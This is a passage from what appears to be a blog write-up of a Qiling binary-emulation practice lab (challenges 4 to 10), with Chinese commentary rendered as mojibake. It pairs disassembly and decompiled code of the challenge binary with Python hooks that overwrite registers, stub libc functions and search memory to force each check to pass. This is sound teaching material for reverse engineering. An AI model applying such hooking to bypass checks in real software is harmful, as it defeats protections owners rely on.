Qiling</span><br><span class="line"><span class="keyword">from</span> qiling.const <span class="keyword">import</span> QL_VERBOSE</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">simple_diassembler</span>(<span class="params">ql: Qiling, address: <span class="built_in">int</span>, size: <span class="built_in">int</span>, md: Cs</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    buf = ql.mem.read(address, size)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> insn <span class="keyword">in</span> md.disasm(buf, address):</span><br><span class="line">        ql.log.debug(<span class="string">f&#x27;:: <span class="subst">&#123;insn.address:#x&#125;</span> : <span class="subst">&#123;insn.mnemonic:24s&#125;</span> <span class="subst">&#123;insn.op_str&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    ql = Qiling([<span class="string">r&#x27;examples/rootfs/x8664_linux/bin/x8664_hello&#x27;</span>], <span class="string">r&#x27;examples/rootfs/x8664_linux&#x27;</span>, verbose=QL_VERBOSE.DEBUG)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># have &#x27;simple_disassembler&#x27; called on each instruction, passing a Capstone disassembler instance bound to</span></span><br><span class="line">    <span class="comment"># the underlying architecture as an optional argument</span></span><br><span class="line">    ql.hook_code(simple_diassembler, user_data=ql.arch.disassembler)</span><br><span class="line"></span><br><span class="line">    ql.run()</span><br></pre></td></tr></table></figure><p>è¿˜æœ‰ä¸€äº›hookï¼Œä¾‹å¦‚æŒ‚é’©ä¸€æ®µä»£ç ã€æŒ‚é’©ä¸­æ–­å·ä»¥è°ƒç”¨è‡ªå®šä¹‰å‡½æ•°ã€æ‹¦æˆªç‰¹å®šç±»å‹çš„æŒ‡ä»¤ç­‰ç­‰</p><p>æˆ‘çš„æƒ³æ³•æ˜¯åœ¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000000E43 39 45 FC                      cmp     [rbp+var_4], eax</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªåœ°å€æ‰§è¡Œå‰ï¼Œåœ¨eaxé‡Œå†™å…¥1ï¼Œè¿™æ ·å°±ä½¿å¾—jlæ¡ä»¶è¾¾æˆï¼Œå°±æˆåŠŸè·³è½¬åˆ°æˆåŠŸç‰‡æ®µ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">write_eax_1</span>(<span class="params">ql</span>):</span><br><span class="line">ql.arch.regs.write(<span class="string">&quot;EAX&quot;</span>,<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge4</span>(<span class="params">ql</span>):</span><br><span class="line">base_addr = ql.mem.get_lib_base(ql.path)</span><br><span class="line">ql.hook_address(write_eax_1,base_addr+<span class="number">0x0E43</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="challenge5"><a href="#challenge5" class="headerlink" title="challenge5"></a>challenge5</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">challenge5</span><span class="params">(_BYTE *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+18h] [rbp-48h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+1Ch] [rbp-44h]</span></span><br><span class="line">  <span class="type">int</span> v5[<span class="number">14</span>]; <span class="comment">// [rsp+20h] [rbp-40h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+58h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v1 = <span class="built_in">time</span>(<span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">srand</span>(v1);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v5[i] = <span class="number">0</span>;</span><br><span class="line">    v5[i + <span class="number">8</span>] = <span class="built_in">rand</span>();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">4</span>; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v5[j] != v5[j + <span class="number">8</span>] )</span><br><span class="line">    &#123;</span><br><span class="line">      *a1 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  *a1 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå°±æ˜¯è®©randçš„è¿”å›å€¼ä¸º0å³å¯</p><p>è¿™é‡Œä¸æ˜¯ç³»ç»Ÿè°ƒç”¨çš„åŠ«æŒï¼Œè€Œæ˜¯åŠ«æŒlibcå‡½æ•°ï¼Œè¿™é‡Œçœ‹ä¸ªä¾‹å­</p><p>ä¸ç³»ç»Ÿè°ƒç”¨ä¸€æ ·ï¼ŒPOSIX libc å‡½æ•°å¯ä»¥ä»¥ç±»ä¼¼çš„æ–¹å¼æŒ‚é’©ï¼Œä»è€Œå…è®¸ç”¨æˆ·æ§åˆ¶å…¶åŠŸèƒ½ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> qiling <span class="keyword">import</span> Qiling</span><br><span class="line"><span class="keyword">from</span> qiling.const <span class="keyword">import</span> QL_INTERCEPT</span><br><span class="line"><span class="keyword">from</span> qiling.os.const <span class="keyword">import</span> STRING</span><br><span class="line"></span><br><span class="line"><span class="comment"># customized POSIX libc methods accept a single argument that refers to the active</span></span><br><span class="line"><span class="comment"># Qiling instance. The Qiling instance may be used to interact with various subsystems,</span></span><br><span class="line"><span class="comment"># such as the memory or registers. The customized method may or may not return a value</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_puts</span>(<span class="params">ql: Qiling</span>):</span><br><span class="line">    <span class="comment"># Qiling offers a few conviniency methods that abstract away the access to the call</span></span><br><span class="line">    <span class="comment"># parameters. specifying the arguments names and types woud allow Qiling to retrieve</span></span><br><span class="line">    <span class="comment"># their values and parse them accordingly.</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># the following call lists a single argument named &#x27;s&#x27;, whose type is &#x27;STRING&#x27;.</span></span><br><span class="line">    <span class="comment"># a dictionary will be created having the key &#x27;s&#x27; mapped to the null-terminated</span></span><br><span class="line">    <span class="comment"># string read from the memory address pointed by the first argument.</span></span><br><span class="line">    params = ql.os.resolve_fcall_params(&#123;<span class="string">&#x27;s&#x27;</span>: STRING&#125;)</span><br><span class="line"></span><br><span class="line">    s = params[<span class="string">&#x27;s&#x27;</span>]</span><br><span class="line">    ql.log.info(<span class="string">f&#x27;my_puts: got &quot;<span class="subst">&#123;s&#125;</span>&quot; as an argument&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># emulate puts functionality</span></span><br><span class="line">    <span class="built_in">print</span>(s)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">len</span>(s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    ql = Qiling([<span class="string">r&#x27;rootfs/x8664_linux/bin/x8664_hello&#x27;</span>], <span class="string">r&#x27;rootfs/x8664_linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    ql.os.set_api(<span class="string">&#x27;puts&#x27;</span>, my_puts, QL_INTERCEPT.CALL)</span><br><span class="line">    ql.run()</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">rand_rets</span>(<span class="params">ql ,*args</span>):</span><br><span class="line">ql.arch.regs.write(<span class="string">&quot;rax&quot;</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge5</span>(<span class="params">ql</span>):</span><br><span class="line">ql.os.set_api(<span class="string">&#x27;rand&#x27;</span>, rand_rets)</span><br><span class="line"><span class="keyword">return</span></span><br></pre></td></tr></table></figure><h3 id="challenge6"><a href="#challenge6" class="headerlink" title="challenge6"></a>challenge6</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000000EF6                               public challenge6</span><br><span class="line">.text:0000000000000EF6                               challenge6 proc near                    ; CODE XREF: start+1D7â†“p</span><br><span class="line">.text:0000000000000EF6</span><br><span class="line">.text:0000000000000EF6                               var_18= qword ptr -18h</span><br><span class="line">.text:0000000000000EF6                               var_5= byte ptr -5</span><br><span class="line">.text:0000000000000EF6                               var_4= dword ptr -4</span><br><span class="line">.text:0000000000000EF6</span><br><span class="line">.text:0000000000000EF6                               ; __unwind &#123;</span><br><span class="line">.text:0000000000000EF6 55                            push    rbp</span><br><span class="line">.text:0000000000000EF7 48 89 E5                      mov     rbp, rsp</span><br><span class="line">.text:0000000000000EFA 48 89 7D E8                   mov     [rbp+var_18], rdi</span><br><span class="line">.text:0000000000000EFE C7 45 FC 00 00 00 00          mov     [rbp+var_4], 0</span><br><span class="line">.text:0000000000000F05 C6 45 FB 01                   mov     [rbp+var_5], 1</span><br><span class="line">.text:0000000000000F09 EB 07                         jmp     short loc_F12                   ; é›¶æ‰©å±•</span><br><span class="line">.text:0000000000000F09</span><br><span class="line">.text:0000000000000F0B                               ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000000000000F0B</span><br><span class="line">.text:0000000000000F0B                               loc_F0B:                                ; CODE XREF: challenge6+22â†“j</span><br><span class="line">.text:0000000000000F0B C7 45 FC 01 00 00 00          mov     [rbp+var_4], 1</span><br><span class="line">.text:0000000000000F0B</span><br><span class="line">.text:0000000000000F12</span><br><span class="line">.text:0000000000000F12                               loc_F12:                                ; CODE XREF: challenge6+13â†‘j</span><br><span class="line">.text:0000000000000F12 0F B6 45 FB                   movzx   eax, [rbp+var_5]                ; é›¶æ‰©å±•</span><br><span class="line">.text:0000000000000F16 84 C0                         test    al, al</span><br><span class="line">.text:0000000000000F18 75 F1                         jnz     short loc_F0B</span><br><span class="line">.text:0000000000000F18</span><br><span class="line">.text:0000000000000F1A 48 8B 45 E8                   mov     rax, [rbp+var_18]</span><br><span class="line">.text:0000000000000F1E C6 00 01                      mov     byte ptr [rax], 1</span><br><span class="line">.text:0000000000000F21 90                            nop</span><br><span class="line">.text:0000000000000F22 5D                            pop     rbp</span><br><span class="line">.text:0000000000000F23 C3                            retn</span><br><span class="line">.text:0000000000000F23                               ; &#125; // starts at EF6</span><br><span class="line">.text:0000000000000F23</span><br><span class="line">.text:0000000000000F23                               challenge6 endp</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä¼šæœ‰ä¸€ä¸ªæ— é™å¾ªç¯ï¼Œ<code>movzx   eax, [rbp+var_5]</code>    å…ˆeaxé›¶æ‰©å±•èµ‹å€¼ä¸º1ï¼Œä¹‹å<code>test    al, al</code>å¯¹alè¿›è¡Œé€»è¾‘ä¸çš„è¿ç®—ï¼Œç»“æœå­˜å…¥ZFä¸­ï¼Œè€Œjnzæ˜¯ZFä¸ä¸º0åˆ™è·³è½¬ï¼Œæ˜¾ç„¶ä¼šæœ‰è·³è½¬ï¼Œä¹‹åä¾¿æ˜¯æ— é™å¾ªç¯ï¼Œæˆ‘çš„æƒ³æ³• ä¾¿æ˜¯hook raxä¸º0å³å¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">write_rax_0</span>(<span class="params">ql</span>):</span><br><span class="line">ql.arch.regs.write(<span class="string">&quot;rax&quot;</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge6</span>(<span class="params">ql</span>):</span><br><span class="line">base_addr = ql.mem.get_lib_base(ql.path)</span><br><span class="line"><span class="keyword">if</span> base_addr <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line"><span class="keyword">raise</span> ValueError(<span class="string">&quot;base_addr is not set correctly&quot;</span>)</span><br><span class="line">ql.hook_address(write_rax_0,base_addr+<span class="number">0xF16</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">write_rax_0</span>(<span class="params">ql</span>):</span><br><span class="line">ql.arch.regs.write(<span class="string">&quot;rax&quot;</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge6</span>(<span class="params">ql</span>):</span><br><span class="line">base_addr = ql.mem.get_lib_base(ql.path)</span><br><span class="line"><span class="keyword">if</span> base_addr <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line"><span class="keyword">raise</span> ValueError(<span class="string">&quot;base_addr is not set correctly&quot;</span>)</span><br><span class="line">ql.hook_address(write_rax_0,base_addr+<span class="number">0xF16</span>)</span><br></pre></td></tr></table></figure><h3 id="challenge7"><a href="#challenge7" class="headerlink" title="challenge7"></a>challenge7</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000000F24                               public challenge7</span><br><span class="line">.text:0000000000000F24                               challenge7 proc near                    ; CODE XREF: start+1FBâ†“p</span><br><span class="line">.text:0000000000000F24</span><br><span class="line">.text:0000000000000F24                               var_8= qword ptr -8</span><br><span class="line">.text:0000000000000F24</span><br><span class="line">.text:0000000000000F24                               ; __unwind &#123;</span><br><span class="line">.text:0000000000000F24 55                            push    rbp</span><br><span class="line">.text:0000000000000F25 48 89 E5                      mov     rbp, rsp</span><br><span class="line">.text:0000000000000F28 48 83 EC 10                   sub     rsp, 10h</span><br><span class="line">.text:0000000000000F2C 48 89 7D F8                   mov     [rbp+var_8], rdi</span><br><span class="line">.text:0000000000000F30 48 8B 45 F8                   mov     rax, [rbp+var_8]</span><br><span class="line">.text:0000000000000F34 C6 00 01                      mov     byte ptr [rax], 1</span><br><span class="line">.text:0000000000000F37 BF FF FF FF FF                mov     edi, 0FFFFFFFFh                 ; seconds</span><br><span class="line">.text:0000000000000F3C E8 0F FB FF FF                call    _sleep</span><br><span class="line">.text:0000000000000F3C</span><br><span class="line">.text:0000000000000F41 90                            nop</span><br><span class="line">.text:0000000000000F42 C9                            leave</span><br><span class="line">.text:0000000000000F43 C3                            retn</span><br><span class="line">.text:0000000000000F43                               ; &#125; // starts at F24</span><br><span class="line">.text:0000000000000F43</span><br><span class="line">.text:0000000000000F43                               challenge7 endp</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæœ‰ä¸¤ç§æƒ³æ³•ï¼Œç¬¬ä¸€ç§ä¾¿æ˜¯ä¿®æ”¹rdiï¼Œåœ¨call sleepå‰å°†rdiæ”¹ä¸º0ï¼Œç¬¬äºŒç§ä¾¿æ˜¯hookæ‰sleepï¼Œç›´æ¥return</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">write_rdi_0</span>(<span class="params">ql</span>):</span><br><span class="line">ql.arch.regs.write(<span class="string">&quot;rdi&quot;</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_sleep</span>(<span class="params">ql,*args</span>):</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge7</span>(<span class="params">ql</span>):</span><br><span class="line">base_addr = ql.mem.get_lib_base(ql.path)</span><br><span class="line"><span class="keyword">if</span> base_addr <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line"><span class="keyword">raise</span> ValueError(<span class="string">&quot;base_addr is not set correctly&quot;</span>)</span><br><span class="line"><span class="comment">#ql.os.set_api(&#x27;sleep&#x27;, my_sleep)</span></span><br><span class="line">ql.hook_address(write_rdi_0,base_addr+<span class="number">0x00F3C</span>)</span><br></pre></td></tr></table></figure><h3 id="challenge8"><a href="#challenge8" class="headerlink" title="challenge8"></a>challenge8</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">_DWORD *__fastcall challenge8(__int64 a1)</span><br><span class="line">&#123;</span><br><span class="line">  _DWORD *result; // rax</span><br><span class="line">  _DWORD *v2; // [rsp+18h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v2 = malloc(0x18uLL);</span><br><span class="line">  *(_QWORD *)v2 = malloc(0x1EuLL);</span><br><span class="line">  v2[<span class="number">2</span>] = <span class="number">0x539</span>;</span><br><span class="line">  v2[<span class="number">3</span>] = <span class="number">0x3DFCD6EA</span>;</span><br><span class="line">  strcpy(*(char **)v2, <span class="string">&quot;Random data&quot;</span>);</span><br><span class="line">  result = v2;</span><br><span class="line">  *((_QWORD *)v2 + <span class="number">2</span>) = a1;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸€é¢˜çš„targetæ˜¯**Unpack the struct and write at the target address.**è§£åŒ…ç»“æ„ä½“ï¼Œç„¶åå†™å…¥ç›®æ ‡åœ°å€</p><p>é‚£ä¹ˆæˆ‘çš„æƒ³æ³•å°±æ˜¯åœ¨mallocä¹‹åhookå°†raxè¿”å›å€¼å­˜å…¥ï¼Œä½†æ˜¯æˆ‘çªç„¶æƒ³åˆ°ï¼Œä¹‹å‰æˆ‘ä»¬ä¸æ˜¯åˆšå­¦äº†å¦‚ä½•æœç´¢å†…å­˜çš„å—ï¼Œé‚£ä¹ˆæˆ‘ä»¬å…ˆé€šè¿‡æœç´¢å†…å­˜è·å¾—åœ°å€ï¼Œç„¶åå†å†™å…¥a1ä¼šä¸ä¼šæ›´é«˜ç«¯ä¸€ç‚¹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">search_mem</span>(<span class="params">ql</span>):</span><br><span class="line">MAGIC=<span class="number">0x3DFCD6EA00000539</span></span><br><span class="line">struct_address = ql.mem.search(p64(MAGIC))</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> struct_address <span class="keyword">or</span> <span class="built_in">len</span>(struct_address) &lt; <span class="number">1</span>:</span><br><span class="line"><span class="keyword">raise</span> ValueError(<span class="string">&quot;struct_address is not properly initialized&quot;</span>)</span><br><span class="line">mem_value1, mem_value2 ,mem_value3 = struct.unpack(<span class="string">&quot;QQQ&quot;</span>, ql.mem.read(struct_address[<span class="number">0</span>]-<span class="number">8</span>,<span class="number">0x18</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] debug1&quot;</span>,<span class="built_in">hex</span>(mem_value1))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] debug2&quot;</span>,<span class="built_in">hex</span>(mem_value2))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] debug3&quot;</span>,<span class="built_in">hex</span>(mem_value3))</span><br><span class="line">ql.mem.write(mem_value3, <span class="string">b&quot;\x01&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge8</span>(<span class="params">ql</span>):</span><br><span class="line">base = ql.mem.get_lib_base(ql.path)</span><br><span class="line">ql.hook_address(search_mem, base+<span class="number">0xFB5</span>)</span><br></pre></td></tr></table></figure><h3 id="challenge9"><a href="#challenge9" class="headerlink" title="challenge9"></a>challenge9</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">challenge9</span><span class="params">(<span class="type">bool</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> *i; <span class="comment">// [rsp+18h] [rbp-58h]</span></span><br><span class="line">  <span class="type">char</span> dest[<span class="number">32</span>]; <span class="comment">// [rsp+20h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="type">char</span> src[<span class="number">40</span>]; <span class="comment">// [rsp+40h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+68h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">strcpy</span>(src, <span class="string">&quot;aBcdeFghiJKlMnopqRstuVWxYz&quot;</span>);</span><br><span class="line">  src[<span class="number">27</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">strcpy</span>(dest, src);</span><br><span class="line">  <span class="keyword">for</span> ( i = dest; *i; ++i )</span><br><span class="line">    *i = <span class="built_in">tolower</span>(*i);</span><br><span class="line">  *a1 = <span class="built_in">strcmp</span>(src, dest) == <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€ä¸ªæƒ³æ³•å°±æ˜¯ç›´æ¥hookæ‰strcmpå‡½æ•°ï¼Œæˆ–è€…ä¹Ÿå¯ä»¥hookæ‰tolowerå‡½æ•°</p><p>è¿™é‡Œå°½é‡hook tolowerå‡½æ•°ï¼Œä¸ç„¶ä¸‹é¢˜å°±åšä¸äº†å•¦~~~</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">my_strcmp</span>(<span class="params">ql,*args</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">ql.arch.regs.write(<span class="string">&quot;rax&quot;</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_lower</span>(<span class="params">ql,*args</span>):</span><br><span class="line">ql.arch.regs.rax = ql.arch.regs.rdi</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge9</span>(<span class="params">ql</span>):</span><br><span class="line"><span class="comment">#ql.os.set_api(&#x27;strcmp&#x27;, my_strcmp,QL_INTERCEPT.EXIT)</span></span><br><span class="line">ql.os.set_api(<span class="string">&#x27;tolower&#x27;</span>, my_lower,QL_INTERCEPT.EXIT)</span><br></pre></td></tr></table></figure><h3 id="challenge10"><a href="#challenge10" class="headerlink" title="challenge10"></a>challenge10</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">challenge10</span><span class="params">(_BYTE *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+10h] [rbp-60h]</span></span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [rsp+14h] [rbp-5Ch]</span></span><br><span class="line">  <span class="type">ssize_t</span> v4; <span class="comment">// [rsp+18h] [rbp-58h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">72</span>]; <span class="comment">// [rsp+20h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+68h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  fd = <span class="built_in">open</span>(<span class="string">&quot;/proc/self/cmdline&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( fd != <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = <span class="built_in">read</span>(fd, buf, <span class="number">0x3F</span>uLL);</span><br><span class="line">    <span class="keyword">if</span> ( v4 &gt; <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">close</span>(fd);</span><br><span class="line">      <span class="keyword">for</span> ( i = <span class="number">0</span>; v4 &gt; 